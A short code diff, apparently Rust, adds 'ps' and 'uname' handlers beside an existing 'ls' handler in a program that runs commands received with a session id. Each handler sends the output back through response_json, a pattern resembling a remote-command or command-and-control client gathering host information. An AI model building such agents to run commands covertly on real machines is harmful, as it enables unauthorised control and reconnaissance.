@@ -134,8 +134,21 @@ println!("\n***HANDLING (VEC) RESPONSE {:?}", _resp);
             let sys_ls = cmd::sys::ls().expect("Oops! Could NOT execute `ls`.");
 println!("\nLS -> {:?}", sys_ls);
 
-            let response = response_json(_sessionid, sys_ls);
-println!("\nUPDATE API -> {:?}", response);
+            response_json(_sessionid, sys_ls);
+        }
+
+        if (exec == "ps") {
+            let sys_ps = cmd::sys::ps().expect("Oops! Could NOT execute `ps`.");
+println!("\nPS -> {:?}", sys_ps);
+
+            response_json(_sessionid, sys_ps);
+        }
+    
+        if (exec == "uname") {
+            let sys_uname = cmd::sys::get_uname().expect("Oops! Could NOT execute `top`.");
+println!("\nUNAME -> {:?}", sys_uname);
+
+            response_json(_sessionid, sys_uname);
         }
     
     }
